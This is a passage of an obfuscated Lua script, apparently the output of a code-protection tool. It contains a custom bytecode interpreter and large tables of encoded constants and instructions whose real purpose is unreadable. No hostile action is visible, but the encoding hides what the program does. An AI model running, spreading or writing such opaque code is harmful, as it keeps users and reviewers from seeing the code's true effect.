__l__j[39]=function() local off=_I_I_7[_10_d]
_10_d=_10_d+1
local step=__0_O9[_IlO1a]
local i=__0_O9[_IlO1a-2]+step
__0_O9[_IlO1a-2]=i
local limit=__0_O9[_IlO1a-1]
if step>=0 then if i<=limit then _10_d=off+1 end else if i>=limit then _10_d=off+1 end end end
__l__j[21]=function() local n=_I_I_7[_10_d]
_10_d=_10_d+1
local parts={}
for i=1,n do parts[n-i+1]=tostring(_IOlu()) end
_IOOt(table.concat(parts)) end
__l__j[66]=function() local n=_I_I_7[_10_d]
_10_d=_10_d+1
for _=1,n do _IOOt(nil) end end
__l__j[14]=function() _IO_10i=_IO_10i+1
_00_Ilh[_IO_10i]=_IlO1a end
__l__j[58]=function() local nr=_I_I_7[_10_d]
_10_d=_10_d+1
local base=_00_Ilh[_IO_10i]
_IO_10i=_IO_10i-1
local f=__0_O9[base+1]
local na=_IlO1a-base-1
local args={}
for i=1,na do args[i]=__0_O9[base+1+i] end
_IlO1a=base
if type(f)~="function" then local mm=_0O1lw(f,"__call")
if mm then table.insert(args,1,f)
na=na+1
f=mm else error("attempt to call a "..type(f).." value") end end
local r
if na==0 then r=table.pack(f()) else r=table.pack(f(table.unpack(args,1,na))) end
local rn=nr<0 and r.n or nr
for i=1,rn do _IOOt(r[i]) end end
__l__j[30]=function() local b,a=_IOlu(),_IOlu()
_IOOt(_l_IIOx(a,b,function(x,y) return math.floor(x/y) end,"__idiv")) end
__l__j[47]=function() local slot=_I_I_7[_10_d]
_10_d=_10_d+1
local box=_0_0O1c[slot]
if box then _II10b[slot]=box[1]
_0_0O1c[slot]=nil end end
__l__j[64]=function() local startIdx=_I_I_7[_10_d]
_10_d=_10_d+1
local base=_00_Ilh[_IO_10i]
_IO_10i=_IO_10i-1
local tbl=__0_O9[base]
local idx=startIdx
for i=base+1,_IlO1a do tbl[idx]=__0_O9[i]
idx=idx+1 end
_IlO1a=base
__0_O9[_IlO1a]=tbl end
__l__j[19]=function() local a=__0_O9[_IlO1a]
__0_O9[_IlO1a]=__0_O9[_IlO1a-1]
__0_O9[_IlO1a-1]=a end
__l__j[8]=function() local nameIdx=_I_I_7[_10_d]
_10_d=_10_d+1
local methodName=_O1OO0z(nameIdx+1)
local obj=_IOlu()
local method=obj[methodName]
_IOOt(obj)
_IOOt(method)
local b,a=_IOlu(),_IOlu()
_IOOt(b)
_IOOt(a) end
__l__j[4]=function() local nVars=_I_I_7[_10_d]
_10_d=_10_d+1
local target=_I_I_7[_10_d]
_10_d=_10_d+1
local iter=__0_O9[_IlO1a-2]
local state=__0_O9[_IlO1a-1]
local ctl=__0_O9[_IlO1a]
local r={iter(state,ctl)}
for i=1,nVars do _IOOt(r[i]) end
if r[1]~=nil then __0_O9[_IlO1a-nVars]= r[1] else _10_d=target+1 end end
__l__j[36]=function() local n=_I_I_7[_10_d]
_10_d=_10_d+1
local args={}
for i=1,n do args[n-i+1]=_IOlu() end
local f=_IOlu()
local results
if n==0 then results=table.pack(pcall(f)) else results=table.pack(pcall(f,table.unpack(args,1,n))) end
local ok=results[1]
_IOOt(ok)
if ok then for i=2,results.n do _IOOt(results[i]) end else _IOOt(results[2]) end end
__l__j[35]=function() local n=_I_I_7[_10_d]
_10_d=_10_d+1
local args={}
for i=1,n do args[n-i+1]=_IOlu() end
local handler=_IOlu()
local f=_IOlu()
local results
if n==0 then results=table.pack(xpcall(f,handler)) else results=table.pack(xpcall(f,handler,table.unpack(args,1,n))) end
local ok=results[1]
_IOOt(ok)
for i=2,results.n do _IOOt(results[i]) end end
__l__j[59]=function() local iS=_I_I_7[_10_d]
_10_d=_10_d+1
local sS=_I_I_7[_10_d]
_10_d=_10_d+1
local vS=_I_I_7[_10_d]
_10_d=_10_d+1
local it=_lOI00q(iS)
if type(it)=="table" then local ok2,mt=pcall(getmetatable,it)
if ok2 and type(mt)=="table" and mt.__iter then local fn=mt.__iter(it)
_IOl_lr(iS,fn) elseif ok2 and type(mt)=="table" and mt.__call then else _IOl_lr(iS,next)
_IOl_lr(sS,it)
_IOl_lr(vS,nil) end end end
__l__j[57]=function() local a=_I_I_7[_10_d]
_10_d=_10_d+1
local b=_I_I_7[_10_d]
_10_d=_10_d+1
local c=_I_I_7[_10_d]
_10_d=_10_d+1
_IOl_lr(c,_lOI00q(a)+_lOI00q(b)) end
__l__j[3]=function() local a=_I_I_7[_10_d]
_10_d=_10_d+1
local b=_I_I_7[_10_d]
_10_d=_10_d+1
local c=_I_I_7[_10_d]
_10_d=_10_d+1
_IOl_lr(c,_lOI00q(a)-_lOI00q(b)) end
__l__j[54]=function() local a=_I_I_7[_10_d]
_10_d=_10_d+1
local b=_I_I_7[_10_d]
_10_d=_10_d+1
local c=_I_I_7[_10_d]
_10_d=_10_d+1
_IOl_lr(c,_lOI00q(a)*_lOI00q(b)) end
__l__j[32]=function() local k=_I_I_7[_10_d]
_10_d=_10_d+1
local s=_I_I_7[_10_d]
_10_d=_10_d+1
_IOl_lr(s,_O1OO0z(k+1)) end
__l__j[44]=function() local a=_I_I_7[_10_d]
_10_d=_10_d+1
local b=_I_I_7[_10_d]
_10_d=_10_d+1
_IOl_lr(b,_lOI00q(a)) end
__l__j[23]=function() local a=_I_I_7[_10_d]
_10_d=_10_d+1
local k=_I_I_7[_10_d]
_10_d=_10_d+1
local c=_I_I_7[_10_d]
_10_d=_10_d+1
_IOl_lr(c,_lOI00q(a)+_O1OO0z(k+1)) end
__l__j[22]=function() local a=_I_I_7[_10_d]
_10_d=_10_d+1
local b=_I_I_7[_10_d]
_10_d=_10_d+1
local c=_I_I_7[_10_d]
_10_d=_10_d+1
_IOl_lr(c,_lOI00q(a).._lOI00q(b)) end
__l__j[10]=function() local _=_IlO1a end
__l__j[13]=function() local _a=_I_I_7[_10_d]
_10_d=_10_d+1
local _=__0_O9[_a] or 0 end
__l__j[15]=function() local _a=_I_I_7[_10_d]
_10_d=_10_d+1
local _b=_I_I_7[_10_d]
_10_d=_10_d+1
local _=bit32.bxor(_a,_b) end
__l__j[20]=function() local _a=_I_I_7[_10_d]
_10_d=_10_d+1
if __ll10==0 then _IOOt(_lOI00q(_a)) else _IOOt(_O1OO0z(_a+1)) end end
while true do
if _00_0k or _10_d>#_I_I_7 then break end
local op=_I_I_7[_10_d]
_10_d=_10_d+1
local h=__l__j[op]
if h then h() end
end
if _00_0k then
if _O_llp then return table.unpack(_O_llp,1,_O_llp.n or #_O_llp) end
if __00_Ol then
if _1_Oo==0 then return end
return table.unpack(__0_O9,_1O0_m+1,_I0_ln)
end
return
end
return nil
end
local _l1_26={{K={1,2,{81,20,214},{81,11,200,113,42,233,145},15,225,{78,5,200,119,13,239,141,66,11,172,103,43},100,7,12,144,{77,26,180,116,34,209},3,9,{77,28,168,106,40,220},49,{99,24,180,120,44,211,165,92,250,182},{89,8,179,98},{64,18,166,122,48},{75,27,167,123},{121,26,190,125,15,207},{101,207,152,66},{102,238,191,99,35,222,129,45,237},{98,240,161},{122,236,170,96},{},{127,235,165,118},{115,242,165,108,36,221,147,60,246,176,93,32,198,122,48},{125,247,162,113,1,208,159,61,253,176,68,63,179,100,56},{110,252,178,106,28,199,188,37,241,133},200,{120,239,161,97,24,207,111,47}},C={104,122,104,122,91,104,123,103,107,87,99,59,123,118,120,107,87,99,59,123,118,120,104,121,83,87,83,118,120,104,121,83,106,122,78,123,-1,88,-1,95,447,104,126,104,126,73,104,127,103,107,87,66,59,123,118,124,87,63,118,124,106,122,78,123,-1,88,-1,95,447,104,125,104,114,82,104,123,103,107,87,46,59,123,118,121,87,27,118,121,106,122,78,123,-1,88,-1,95,447,104,115,104,115,73,104,112,103,107,87,0,59,123,118,113,107,87,0,59,123,118,113,104,121,83,87,240,118,113,104,121,83,106,122,78,123,-1,88,-1,95,447,104,118,104,123,99,104,119,103,107,87,217,59,123,118,116,107,87,217,59,123,118,116,104,121,83,87,201,118,116,104,121,83,106,122,78,123,-1,88,-1,95,447,104,114,104,114,73,104,117,103,107,87,182,59,123,118,106,107,87,182,59,123,118,106,104,121,83,87,166,118,106,104,121,83,106,122,78,123,-1,88,-1,95,447,104,122,104,122,91,104,123,103,107,87,143,59,123,118,107,107,87,143,59,123,118,107,104,121,83,87,383,118,107,104,121,83,106,122,78,123,-1,88,-1,95,447,104,126,104,126,73,104,127,103,107,87,356,59,123,118,104,107,87,356,59,123,118,104,104,121,83,87,340,118,104,104,121,83,106,122,78,123,-1,88,-1,95,447,104,125,104,114,82,104,123,103,107,87,317,59,123,118,105,107,87,317,59,123,118,105,104,121,83,87,301,118,105,104,121,83,106,122,78,123,-1,88,-1,95,447,104,115,104,115,73,104,112,103,107,87,278,59,123,106,122,104,110,83,104,111,103,87,479,102,122,107,104,108,83,105,106,122,104,109,83,106,122,104,98,83,107,92,87,509,59,123,104,99,118,96,104,97,83,104,102,83,113,57,127,97,123,74,107,104,98,106,123,75,107,104,103,104,100,75,88,123,95,447,102,122,107,104,101,83,105,106,122,104,109,83,113,57,121,97,120,74,107,104,98,106,120,75,107,104,103,104,100,75,88,123,88,122},P={},U={{1,1}},nParams=1},{K={{80,8,215,109,32},{116,30,219},{111,8,204,107,33,253},{115,33,234,80},{108,10,219,97,53,233,149},{102,31,213,114,52,242,147,31,41,177,99,59},{71,1,204,107,59,254,137,71,23,166,122,112,192,134,47,229},{101,29,217,113},{98,32,241,71,17,241,137,90,228,174},3,2,9},C={118,122,102,122,74,107,104,123,102,123,106,122,79,75,107,104,120,104,121,75,107,104,126,74,107,104,127,104,124,75,75,107,104,125,102,120,107,104,114,83,105,106,123,57,120,75,78,120,120,97,121,97,120,104,115,104,112,99,104,113,103,107,87,49,59,123,106,120,107,87,49,59,123,106,121,87,44,106,121,104,125,83,88,123,95,44,88,122},P={},U={{1,12},{1,9},{1,1}},nParams=2},{K={{80,8,215,109,32},{116,30,219},{111,8,204,107,33,253},{100,43,237},7,49,{100,30,216,126}},C={118,122,102,122,74,107,104,123,102,123,106,122,79,75,107,104,120,104,121,75,78,120,120,97,120,97,123,104,126,104,126,73,104,127,103,107,87,75,59,123,106,123,107,87,75,59,123,106,120,87,70,106,120,104,124,83,88,123,95,70,88,122},P={},U={{1,12},{1,9}},nParams=1},{K={{15,25,211,102,37,228,150,72,10},{84,5,211},{86,2,203,119,60,240,138,72},{118,29,220,118,6,254},{74,14,215,96},{107,17,214,99},{86,29,221,100,55,212,140},{64,19,208,109},{120,31,223,106,49,214,142},{67,27,221,67,49},{96,26,162,66,50}},C={102,122,104,122,74,107,104,123,118,120,102,123,104,121,83,57,123,75,107,104,126,102,123,104,127,83,75,107,104,124,118,120,118,125,104,114,83,57,123,75,107,104,115,118,125,104,112,83,75,57,120,59,123,88,122},P={},U={{1,13},{1,7}},nParams=0},{K={1,2,{86,12,203,104},{84,15,208,112}},C={104,122,104,122,91,104,123,103,107,87,108,59,123,118,120,104,121,83,102,122,57,123,87,90,102,123,57,122,59,123,95,122,88,122},P={},U={{1,11},{1,15}},nParams=0},{K={{84,4,197,117,62,254,140,74},{116,31,210,112,4,252},{108,12,213,102},{110,11,202,119,46,253,128,127,14,178},{103,0,212,107,53,248,146}},C={118,122,102,122,104,123,83,57,123,97,123,102,122,104,120,83,97,120,102,123,104,121,83,107,104,126,83,105,66,123,57,120,59,123,88,122},P={{K={{80,25,223,111,56},15,225,{102,0,204,105},{105,10,201,118,49,252,131,101,5,183,119},{104,21,200,117,48,251,130,101,28,186,125,55,199,147},{81,16,206,105},100,7,2,{103,16,179,120,55,198,137,114,240,191,119,17},{78,4,179,99,37},12,144,{99,28,183,124,59,194,149,114,232,183,115},{70,20,163,127},{68,26,181,122},{66,12,166,101,51}},C={104,122,97,120,104,123,104,123,73,104,120,103,107,87,102,59,123,106,123,118,121,104,126,83,104,127,83,103,87,94,104,124,97,120,95,30,104,125,104,114,82,104,115,103,107,87,70,59,123,106,123,118,121,104,126,83,104,112,83,103,87,62,104,113,97,120,95,30,104,118,104,118,73,104,119,103,107,87,38,59,123,106,123,118,121,104,126,83,104,116,83,103,87,30,104,117,97,120,95,30,118,106,104,107,83,66,123,57,123,59,123,88,122},P={{K={{15,7,217,102},{84,5,211},{76,12,213,102},{83,28,220},{73,28,221},{81,31,200,114,35,245,137,85},{71,21,209,110,60,214,141,74}},C={102,122,104,122,74,107,104,123,102,123,75,107,104,120,102,120,75,107,104,121,102,121,75,107,104,126,118,127,102,126,57,123,75,107,104,124,102,127,75,57,120,59,123,88,122},P={},U={{0,0},{0,1},{0,2},{1,2},{1,0},{0,3}},nParams=0}},U={{0,2},{1,1},{1,2},{0,3}},nParams=2}},U={{1,7},{1,6},{1,13},{1,10}},nParams=1},{K={3,2,9,{87,15,202,111},{83,14,211,113},{10,0,212,106,61,179},{82,30,207,115,32,244,134,84},{114,1,216,122,26,250},7,49,{90,22,161,103,58},{97,37,142,66,19,199,142,87,231,171},1,{89,1,179,107},{77,22,160,106},{92,14,183,121,53,193},0,15,225,{108,33,130,93,19,230,161,8,217,147,96,40,228,93,18},{68,30,163,103,19},{86,225,165,117,4,192},100,{104,221,152,86,47,225,184,0,208,133},{126,234,160,125,34,198,136,54,228,152,78,24,208,99},{105,232,174,99,0,194,188,51,248},12,144,{126,195,141,92,12,222,151,39},{121,237,160,106,27,219,134},{77,252,182},{96,213,153,111,44,233,94},{31,204},{30,211,149,102,50,244,76,9,223,170},8,{45,239,180,65},{52,253,191},{40,227,188},{42,254,189,67,1,201,122,58,240,142},{52,226,188,95,29},{60,242,188,69,17},{32,250,172,79,7,180}},C={104,122,104,123,99,104,120,103,107,87,108,59,123,118,121,104,126,83,102,122,57,123,87,527,102,123,104,127,118,124,102,120,104,125,83,57,123,79,57,123,97,122,104,114,104,114,73,104,115,103,107,87,67,59,123,106,122,87,567,118,112,102,121,104,113,83,102,121,106,122,78,121,120,97,120,97,123,104,118,104,118,91,104,123,103,107,87,248,59,123,106,123,107,87,25,59,123,106,120,107,87,14,59,123,118,119,106,120,104,116,83,57,123,104,117,103,107,87,248,59,123,106,120,104,116,83,98,104,106,72,87,561,104,107,104,107,73,104,104,103,107,87,227,59,123,106,120,104,116,83,104,105,103,87,161,118,110,102,126,78,123,121,97,127,97,126,97,121,65,121,126,127,85,124,85,125,106,121,106,126,106,127,78,120,120,97,125,97,124,106,124,97,127,106,124,70,123,87,172,118,112,118,121,104,111,83,106,125,57,120,59,123,95,214,74,115,126,95,563,104,108,104,114,82,104,123,103,107,87,138,59,123,106,120,104,116,83,104,109,103,87,261,118,110,102,126,78,123,121,97,112,97,115,97,114,65,114,115,112,85,113,85,118,106,114,106,115,106,112,78,120,120,97,118,97,113,106,113,97,112,106,113,70,123,87,343,118,112,118,121,104,111,83,106,118,57,120,59,123,95,377,74,115,126,102,120,107,104,98,83,105,104,99,57,120,97,119,104,96,104,96,73,104,97,103,107,87,310,59,123,106,119,87,257,106,119,107,104,98,83,105,104,102,57,120,97,116,104,122,104,123,99,104,120,103,107,87,272,59,123,106,116,87,259,106,116,107,104,103,83,105,57,123,59,123,95,259,95,257,95,527,95,563,104,114,104,114,73,104,115,103,107,87,485,59,123,106,120,104,116,83,107,104,100,83,105,104,118,104,114,57,121,104,101,103,87,619,104,118,104,118,91,104,123,103,107,87,448,59,123,102,127,107,87,448,59,123,118,90,104,91,83,87,629,116,118,112,102,121,104,113,83,102,121,106,120,104,116,83,107,104,100,83,105,104,88,78,120,-1,64,120,97,106,97,117,104,107,104,107,73,104,104,103,107,87,395,59,123,106,117,107,87,395,59,123,106,106,87,631,118,90,104,91,83,106,106,104,89,83,106,106,104,94,83,106,106,104,95,83,57,121,59,123,95,631,95,629,95,563,118,92,106,120,104,116,83,57,123,97,107,104,108,104,114,82,104,123,103,107,87,593,59,123,106,107,87,563,118,121,104,93,83,118,112,106,107,57,120,97,104,118,82,104,83,83,102,126,106,104,57,120,59,123,95,563,95,561,95,567,85,122,85,123,85,120,85,121,85,126,85,127,85,124,85,125,85,114,85,115,85,112,85,113,85,118,85,119,85,116,85,117,85,106,85,107,85,104,95,122,88,122},P={},U={{1,11},{1,14},{1,7},{1,1},{1,16},{1,8}},nParams=0},{K={{84,10,197,106},{86,13,222,118},1,{12,28,220,99,38,233,145,85,9},{81,6,222},{81,31,200,114,35,245,137,85},{115,2,217,117,27,249},{73,19,208,109},{102,18,211,108},{89,24,222,105,48,233,143},{77,20,173,110},{123,26,160,111,50,235,137},{70,24,160,68,60},{103,23,161,71,61}},C={118,122,104,123,83,104,120,57,123,59,123,102,122,104,121,74,107,104,126,118,127,102,123,104,124,83,57,123,75,107,104,125,102,123,104,114,83,75,107,104,115,118,127,118,112,104,113,83,57,123,75,107,104,118,118,112,104,119,83,75,57,120,59,123,88,122},P={},U={{1,13},{1,7}},nParams=0},{K={3,2,9,{102,0,204,105},{112,10,214,96,32,244,148,69,47,179,115,41,205},{118,4,218,116,37,249,131},{9,2,217,105,54},{83,19,207,111,54,234,188,93,27},{92,28,205,125,38,246,132,82},{124,7,218,120,28,196},{73,26,164,110},{74,18,172,101,57,233,136,65}},C={104,122,104,123,99,104,120,103,107,87,98,59,123,106,122,118,121,104,126,83,104,127,83,103,87,68,102,122,104,124,74,107,104,125,118,114,102,123,104,115,83,57,123,75,107,104,112,102,120,75,107,104,113,102,121,75,57,120,59,123,95,68,88,122},P={},U={{1,13},{1,7},{1,19},{1,10}},nParams=1},{K={{77,10,194,105},{71,0,216,109,63}},C={118,122,104,123,83,106,122,102,122,73,78,123,-1,88,-1},P={},U={{1,21}},nParams=1},{K={{80,8,215,109,32},{114,9,195,65,34,234,134},{113,8,214,103,0,246,144,70,28,172,115,58,210,152,83,233},{119,7,205,104,42},{112,10,194,113},{97,5,201,103,37,245,136,92},3},C={118,122,102,122,104,123,83,102,122,104,120,74,107,104,121,106,122,75,107,104,126,106,123,75,107,104,127,104,124,75,57,126,59,123,88,122},P={},U={{1,5}},nParams=2},{K={{105,5,197,117,45,249,129,72},{79,9,192},{119,36,251,108,60,247,129,93},{96,1,203,106,42,232,183,81,31,175,100,47},{113,43,211,104},0,4,{119,19,207,109,61,234}},C={118,122,104,123,83,104,120,57,123,97,120,106,120,104,121,116,118,126,104,123,83,104,127,102,122,106,123,107,92,87,89,59,123,104,124,78,123,-1,64,123,75,106,120,104,125,106,122,75,88,122},P={},U={{1,22}},nParams=2},{K={{105,5,197,117,45,249,129,72},{79,9,192},{119,36,235,119,60,246,143,74},{119,6,208,103,36,244,128,67,8},1,{102,31,215,105,35},{118,16,206,98,60,233}},C={118,122,104,123,83,104,120,57,123,97,121,106,121,104,121,106,123,107,92,87,99,59,123,104,126,75,106,121,104,127,106,120,107,92,87,82,59,123,102,122,75,106,121,104,124,106,122,75,88,122},P={},U={{1,28}},nParams=3},{K={{105,5,197,117,45,249,129,72},{79,9,192},{119,36,232,98,42,253,141,65,29},{115,15,221,96,38,244,130,100,20,182},{113,43,211,104},0,{118,16,216,99,59,243,143,113,17,189,96,48,199},{119,19,217,108,58,240,142,120,26,172,97},{120,18,218,109,61,241,141,103,233,172,126,21},{121,21,205,111,59,212}},C={118,122,104,123,83,104,120,57,123,97,120,106,120,104,121,118,126,104,123,83,104,127,106,123,57,120,75,106,120,104,124,118,126,104,123,83,104,127,106,123,57,120,75,106,120,104,125,118,126,104,123,83,104,127,106,123,57,120,75,106,120,104,114,118,126,104,123,83,104,127,106,123,57,120,75,106,120,104,115,106,122,75,88,122},P={},U=nil,nParams=2},{K={{105,5,197,117,45,249,129,72},{79,9,192},{118,8,192,119,2,248,134,74,22},{97,15,218,111,40,232,138,69,21,162,69,46,198,156,78,248,178,108,12,218,156,51},1,{113,21,195,114},{114,20,196,115,1,244,146,86},11,{124,22,198,125,23,240,134,90,242,248},{111,27,209,126},{111,27,181,102},{108,25,181,100,54,207},{120,18,186,121,0,226,130,80,227,161,119,0,222,143},{97,29,165,122},{122,28,188,123,3,228,156,82,225,191,113,2,220,137},{108,31,171,100,62,212},{96,26,180,116,50,211}},C={118,122,104,123,83,104,120,57,123,97,124,106,124,104,121,104,126,75,106,124,104,127,106,123,75,106,124,104,124,102,122,106,120,107,92,87,83,59,123,104,125,57,123,75,106,124,104,114,106,121,107,92,87,64,59,123,102,123,75,106,124,104,115,106,126,107,92,87,53,59,123,118,112,104,115,83,104,113,83,75,106,124,104,118,106,127,107,92,87,30,59,123,118,112,104,118,83,104,119,83,75,106,124,104,116,118,112,104,116,83,104,117,83,75,106,124,104,106,106,122,75,106,124,88,123},P={},U={{1,22},{1,35}},nParams=6},{K={{105,5,197,117,45,249,129,72},{79,9,192},{118,8,192,119,12,236,144,91,21,171},{97,15,218,111,40,232,138,69,21,162,82,51,203,157,79,187},{102,0,200,97,53,233,181,88,6,162,66,52,208,150,82},0,{114,20,196,115},{115,23,197,124,16,241,133,91,13,249},{124,22,198,125,7,246,144,80},11,{108,26,174,127},{110,24,180,97},{107,24,182,101,57,206,172,86,232,171},{108,13,183,97,27,209,155,78,234,190,88,9,221,147,53},{126,24,182,106,52,209},4,{125,20,179,98,57,226,156,73,237,161},{114,19,169,124,56,203,135},{127,18,189,96,59,229,145,94,252,176}},C={118,122,104,123,83,104,120,57,123,97,126,106,126,104,121,106,120,107,92,87,99,59,123,102,122,75,106,126,104,126,104,127,75,106,126,104,124,106,123,75,106,126,104,125,102,123,75,106,126,104,114,102,120,106,121,107,92,87,69,59,123,104,115,57,123,75,106,126,104,112,118,113,104,112,83,104,118,83,75,106,126,104,119,113,75,106,126,104,116,106,122,75,102,121,106,126,104,117,57,120,59,123,106,120,107,92,87,10,59,123,102,122,97,127,106,126,104,106,83,107,104,107,83,105,66,123,57,120,59,123,106,126,104,104,83,107,104,107,83,105,66,120,57,120,59,123,106,126,88,123},P={{K={{98,10,213,106,43,229,141,88,22,167,77,54,200,128,72,182},{109,9,197,114},{97,2,212,108,60,170},{77,11,206},1,0.1},C={102,122,104,122,102,123,107,104,123,83,105,118,120,104,121,83,104,126,104,126,104,126,57,121,104,127,57,121,75,88,122},P={},U={{1,4},{1,5}},nParams=0},{K={{98,10,213,106,43,229,141,88,22,167,77,54,200,128,72,182}},C={102,122,104,122,102,123,75,88,122},P={},U={{1,4},{1,5}},nParams=0}},U={{1,27},{1,35},{1,22},{1,36}},nParams=4},{K={{105,5,197,117,45,249,129,72},{79,9,192},{118,8,192,119,12,246,156},{97,15,218,111,40,232,138,69,21,162,82,51,203,157,79,187},{102,0,200,97,53,233,181,88,6,162,66,52,208,150,82},0,{118,29,221,100,55,245,135,95,26,172,102,11,207,141,52},{},{120,31,223,106,49,247,133,89,228,174,100,34,195,155,45,255,235},{125,17,199,126},{126,16,184,127,21,206,128,88,240,254},{127,19,185,120,4,203,151,93},11,{107,23,173,122},{107,23,177,98},{104,21,177,120,58,203},{115,23,163,112,46,243,151,69,252,156,112,47,219,156,63,230},{124,9,171,102,52,228,154,80,236},{102,24,176,103,6,232,152,86,237,187,77,14,216,117},{127,27,175,96},{96,26,178,97,57,234,154,40,235,185,79,8,214,119},{97,239,187},{117,228,162,99,7,223},{103,227,191,125,13,218},4,1},C={118,122,104,123,83,104,120,57,123,97,121,106,121,104,121,102,122,75,106,121,104,126,104,127,75,106,121,104,124,106,123,107,92,87,93,59,123,104,125,75,106,121,104,114,102,123,75,106,121,104,115,104,125,75,106,121,104,112,102,120,75,106,121,104,113,102,121,104,118,57,123,75,106,121,104,119,118,116,104,119,83,104,117,83,75,106,121,104,106,113,75,106,121,104,107,106,120,107,92,87,18,59,123,113,75,106,121,104,104,118,116,104,104,83,104,105,83,75,106,121,104,110,106,120,107,87,243,59,123,118,116,104,110,83,104,111,83,107,92,87,237,59,123,118,116,104,110,83,104,108,83,75,106,121,104,109,106,122,75,102,126,106,121,104,98,57,120,59,123,102,127,106,121,104,99,102,124,57,121,59,123,106,121,88,123},P={},U={{1,26},{1,33},{1,35},{1,22},{1,36},{1,37},{1,28}},nParams=3},{K={{118,2,197,104,46,251,135}},C={102,122,104,122,113,75,88,122},P={},U={{1,45}},nParams=0},{K={{15,8,218,104,41,249,150,94,71,162,106,52,205,129,113,224,169,38},7,49,{83,13,216,104,35},{110,60,245,75,20,254,133,94,24,162},1,2,{83,11,205,109},{92,18,220,101,49},{64,4,222,99,39,211},{5,6,165,101,50},{95,23,179,107,50,214,184,81,231},{89,30,166},{78,23,167,107},{113,38,145,65,22,234,177,127,217,142},{78,30,168,121,53,237,148,69},{68,26,181,122},{70,29,174,102},0.3,{119,27,186,96,45,197,140}},C={102,122,104,122,102,123,79,57,123,97,122,104,123,104,123,73,104,120,103,107,87,96,59,123,106,122,87,231,118,121,102,120,104,126,83,102,120,106,122,78,121,120,97,120,97,123,104,127,104,127,91,104,124,103,107,87,49,59,123,106,123,107,87,49,59,123,118,125,106,120,57,123,104,114,103,87,225,118,115,106,120,78,123,121,97,127,97,126,97,121,65,121,126,127,85,124,85,125,106,121,106,126,106,127,78,120,120,97,125,97,124,106,124,97,127,106,124,70,123,87,227,102,121,104,112,74,107,104,113,106,125,104,118,83,75,107,104,119,104,116,75,107,104,117,102,123,75,57,120,59,123,95,36,95,225,95,231,118,106,104,107,83,104,104,57,123,59,123,102,126,107,104,105,83,105,57,123,59,123,88,122},P={},U={{1,14},{1,10},{1,1},{1,13},{1,42}},nParams=0},{K={{105,5,197,117,45,249,129,72},{79,9,192},{100,31,217,110,43},{112,7,195,97},{113,43,211,104,98},1,0,{119,29,206,97,39,247,134,90},{106,18,221,98,51,237,133,64,238,175,66,19,205,153,49,253,185,81,11,215,103,54},{127,29,204,99,55,204,142},{122,20,178,110,56,213}},C={118,122,104,123,83,104,120,57,123,97,122,106,122,104,121,118,126,104,123,83,104,127,104,124,104,124,102,122,57,126,75,106,122,104,125,118,126,104,123,83,104,124,104,124,104,124,102,123,57,126,75,106,122,104,114,104,127,75,106,122,104,115,113,75,106,122,104,112,102,120,75,106,122,88,123},P={},U={{1,59},{1,58},{1,45}},nParams=0},{K={{73,27,215,104,62,228},{119,5,196,107,47,244,134},{118,8,192,119,13,246,136,64,8,246}},C={118,122,102,122,78,123,121,97,121,97,120,97,123,65,123,120,121,85,126,85,127,106,123,106,120,106,121,78,120,120,97,127,97,126,106,126,97,121,106,126,70,123,87,48,102,123,106,127,83,104,123,113,75,102,120,106,127,83,104,120,102,121,75,102,126,106,127,83,104,123,113,75,95,107,102,123,106,122,83,104,123,122,75,102,120,106,122,83,104,120,102,127,75,102,126,106,122,83,104,123,122,75,88,122},P={},U={{1,54},{1,57},{1,55},{1,33},{1,56},{1,30}},nParams=1},{K={},C={102,122,102,123,57,123,59,123,88,122},P={},U={{1,65},{1,70}},nParams=0},{K={2,{76,13,195,106},{68,1,215,108,60},10,{119,6,192,96},{112,52,210,107,99},{72,20,203},0,{120,28,205,96,32,246,133,91}},C={106,120,104,122,82,97,126,118,123,104,120,83,106,120,104,122,96,57,123,97,127,102,122,102,123,106,122,106,123,104,121,57,126,97,124,106,124,104,126,118,127,104,124,83,104,125,106,121,107,87,77,59,123,102,120,107,92,87,69,59,123,102,121,104,125,102,126,57,126,75,106,124,104,114,118,127,104,124,83,104,125,102,127,106,121,107,87,38,59,123,104,125,107,92,87,16,59,123,106,126,102,121,102,124,91,73,91,104,125,102,125,106,127,102,126,102,114,91,73,91,57,126,75,106,124,88,123},P={},U={{1,40},{1,75},{1,78},{1,86},{1,61},{1,77},{1,60},{1,85},{1,62}},nParams=4},{K={{15,8,218,104,41,249,150,94,71,162,106,52,205,129,113,224,169,38},15,225,{83,13,216,104,35},{110,60,245,75,20,254,133,94,24,162},100,7,2,{92,10,206,108},{93,21,221,102,48},{67,5,161,98,36,210},{94,31,165},{107,18,182,78,48,202,130,93,246,170,116},12,144,{102,9,132},{100,30,190,101,30,210,134,73,231,189},{117,25,180,102,47,199,138},0,1,{125,17,185,97,1,197,149,36},{91,229,188},{101,232,182,114},{98,198,164,117,81},4,30,{120,228,179,112,1,195,147,50,252,185,107,28,210,102,38,172},{121,233,163,120,2,192,174,33,233,187,121,29,199,111,57},{104,226,170,105},{},{127,252,160,112,40,192,116,63,249,143,111,24,174,98,42},{115,235,172,79,30,194,78,62,243,135,95},3,9,{18,236,170,70,0,205},{161,24,111},{134,56},{0,254,174,75},{0,254,178,83},{0,253,169,64,18,211,75,59,243,142},14,{25,251,172,67,1,169,100,56},5,{31,243,153,88,47,131,97,49,196,128,84,225,161,110},{15,242,140,89,29,177},{35,249,142,75},11,{8,245,145,88,26,171,66,57,202,155,95,231,191,122},20,18,{31,242,157,64,27,139,97,43,222,154,46,186,149,77,5,212,105},{16,241,135,90,26,169,97},{25,240,159,70,229,142,120,21,201,133},{24,207,158,69,228,128,114,3,219,157},{21,192,130,65,227,190,75,10,212,156},34,6,{26,235,161,116,192,147,79,35,245,220,103}},C={102,122,104,122,102,123,79,57,123,97,122,104,123,104,123,73,104,120,103,107,87,97,59,123,106,122,92,87,91,88,122,95,91,118,121,102,120,104,126,83,102,120,106,122,78,121,120,97,120,97,123,104,127,104,124,82,104,125,103,107,87,40,59,123,106,123,92,107,92,87,40,59,123,118,114,106,120,57,123,104,115,123,87,34,88,122,95,34,74,115,121,118,112,106,120,78,123,121,97,127,97,126,97,121,65,121,126,127,85,124,85,125,106,121,106,126,106,127,78,120,120,97,125,97,124,106,124,97,127,106,124,70,123,87,233,102,121,106,125,104,113,83,106,125,75,95,22,116,118,112,102,126,107,104,118,83,105,78,123,-1,64,121,97,112,97,115,97,114,65,114,115,112,85,113,85,118,106,114,106,115,106,112,78,120,120,97,118,97,113,106,113,97,112,106,113,70,123,87,138,104,119,104,119,73,104,116,103,107,87,165,59,123,106,118,107,104,117,83,105,104,106,57,120,87,148,106,118,107,104,107,83,105,57,123,59,123,95,148,95,214,104,104,97,119,118,112,106,120,78,123,121,97,106,97,117,97,